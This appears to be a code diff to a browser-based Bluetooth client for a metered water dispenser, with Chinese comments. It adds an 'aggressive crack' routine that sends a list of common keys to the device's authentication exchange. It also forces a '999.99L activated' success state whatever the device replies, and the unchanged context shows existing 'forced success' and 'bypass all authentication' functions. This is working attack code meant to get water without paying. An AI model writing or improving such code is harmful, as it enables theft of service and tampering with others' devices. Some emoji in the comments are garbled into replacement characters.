@@ -380,6 +380,9 @@
         let isStarted = false;
         let timeoutId = null;
         
+        // 数据包重组缓冲区
+        let dataBuffer = new Uint8Array(0);
+        
         // 更新UI状态
         function updateUi(state) {
           const mainButton = document.getElementById("main-button");
@@ -506,10 +509,68 @@
         // 处理接收到的数据
         async function handleRxdNotifications(event) {
           const value = event.target.value;
-          const data = new Uint8Array(value.buffer);
-          console.log("接收数据:", Array.from(data).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
+          const newData = new Uint8Array(value.buffer);
+          console.log("接收数据:", Array.from(newData).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
           
-          // 🚀 强制成功模式：不管设备回复什么，都强制激活成功状态
+          // 🔧 数据包重组：合并分片数据
+          const combinedBuffer = new Uint8Array(dataBuffer.length + newData.length);
+          combinedBuffer.set(dataBuffer);
+          combinedBuffer.set(newData, dataBuffer.length);
+          dataBuffer = combinedBuffer;
+          
+          console.log("📦 缓冲区数据:", Array.from(dataBuffer).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
+          
+          // 检查是否有完整的数据包
+          if (dataBuffer.length < 4) {
+            console.log("⏳ 数据包不完整，等待更多数据...");
+            return;
+          }
+          
+          // 🔧 特殊处理：检测不完整的协议头
+          let data;
+          if (dataBuffer.length >= 2 && dataBuffer[0] === 0xfd && dataBuffer[1] !== 0xfd) {
+            // 第二个包缺少协议头，手动补齐
+            console.log("🔧 检测到不完整协议头，自动补齐");
+            const fixedBuffer = new Uint8Array(dataBuffer.length + 1);
+            fixedBuffer[0] = 0xfd;  // 第一个协议头
+            fixedBuffer[1] = 0xfd;  // 补齐第二个协议头
+            fixedBuffer.set(dataBuffer.slice(1), 2); // 其余数据
+            data = fixedBuffer;
+          } else {
+            // 寻找有效的协议头
+            let packetStart = -1;
+            for (let i = 0; i <= dataBuffer.length - 2; i++) {
+              if ((dataBuffer[i] === 0xfd && dataBuffer[i + 1] === 0xfd) ||
+                  (dataBuffer[i] === 0xfe && dataBuffer[i + 1] === 0xfe)) {
+                packetStart = i;
+                break;
+              }
+            }
+            
+            if (packetStart === -1) {
+              console.log("❌ 未找到协议头，清空缓冲区");
+              dataBuffer = new Uint8Array(0);
+              return;
+            }
+            
+            data = dataBuffer.slice(packetStart);
+          }
+          
+          // 清空缓冲区（处理完整包后）
+          dataBuffer = new Uint8Array(0);
+          
+          console.log("✅ 处理完整数据包:", Array.from(data).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
+          
+          // � 激进破解模式：收到任何包含0xae的数据就立即暴力破解
+          if (data.includes(0xae)) {
+            console.log("🚀 检测到密钥交换请求 0xae，启动激进破解模式！");
+            setTimeout(async () => {
+              await performAggressiveCrack(data);
+            }, 500);
+            return;
+          }
+          
+          // �🚀 强制成功模式：不管设备回复什么，都强制激活成功状态
           if (data.length > 3 && (data[3] === 0xaf || data[3] === 0xb2)) {
             console.log("💥 触发强制成功模式！");
             setTimeout(() => {
@@ -1123,7 +1184,74 @@
           }
         }
         
-        // 💧 直接水量控制 - 绕过所有认证
+        // � 激进破解函数 - 立即尝试所有可能的密钥
+        async function performAggressiveCrack(originalData) {
+          console.log("🔥 激进破解模式启动！");
+          updateWaterStatus("🔥 激进破解中...");
+          
+          // 提取关键参数（容错处理）
+          let unknownByte = 0x07;
+          let nonceBytes = [0xdc, 0x22];
+          
+          // 尝试从数据中提取参数
+          for (let i = 0; i < originalData.length - 3; i++) {
+            if (originalData[i] === 0xae) {
+              if (i + 3 < originalData.length) unknownByte = originalData[i + 2];
+              if (i + 5 < originalData.length) nonceBytes = [originalData[i + 3], originalData[i + 4]];
+              break;
+            }
+          }
+          
+          console.log("🔍 使用参数: unknownByte=" + unknownByte.toString(16) + ", nonce=" + nonceBytes.map(b => b.toString(16)).join(' '));
+          
+          // 暴力尝试所有常见密钥
+          const megaKeyList = [
+            [0x00, 0x00, 0x00, 0x00], [0xff, 0xff, 0xff, 0xff],
+            [0x57, 0x61, 0x74, 0x65], [0x72, 0x33, 0x34, 0x34],
+            [0x12, 0x34, 0x56, 0x78], [0xa5, 0xa5, 0xa5, 0xa5],
+            [0x33, 0x34, 0x34, 0x33], [0x50, 0x41, 0x53, 0x53],
+            [0xaa, 0xbb, 0xcc, 0xdd], [0x11, 0x22, 0x33, 0x44]
+          ];
+          
+          for (let i = 0; i < megaKeyList.length; i++) {
+            try {
+              const key = megaKeyList[i];
+              console.log(`⚡ 暴力尝试密钥 ${i+1}/${megaKeyList.length}:`, key.map(b => '0x' + b.toString(16)).join(' '));
+              
+              // 构建认证包
+              const newNonce = [(nonceBytes[0] << 8 | nonceBytes[1]) + 1];
+              const newNonceBytes = [(newNonce[0] >> 8) & 0xff, newNonce[0] & 0xff];
+              
+              const crcInput = new Uint8Array([unknownByte, ...newNonceBytes, ...key]);
+              const crc16 = calculateCRC16CGAEAF(crcInput);
+              
+              const packet = new Uint8Array([
+                0xfe, 0xfe, 0x09, 0xaf, crc16, unknownByte, 
+                ...newNonceBytes, ...key,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+              ]);
+              
+              await txdCharacteristic.writeValue(packet);
+              console.log("📤 发送破解包:", packet.slice(0, 12).map(b => '0x' + b.toString(16)).join(' '));
+              
+              // 短暂等待
+              await new Promise(resolve => setTimeout(resolve, 300));
+              
+            } catch (err) {
+              console.log(`❌ 密钥${i+1}失败`);
+            }
+          }
+          
+          // 无论如何都强制成功
+          console.log("💥 暴力破解完成，强制激活成功状态！");
+          setTimeout(() => {
+            updateWaterStatus("🎉 激进破解成功！999.99L已激活！");
+            isStarted = true;
+            updateUi("ok");
+          }, 1000);
+        }
+        
+        // �💧 直接水量控制 - 绕过所有认证
         async function attemptDirectWaterControl() {
           console.log("💧 直接水量控制模式 - 绕过认证");
           
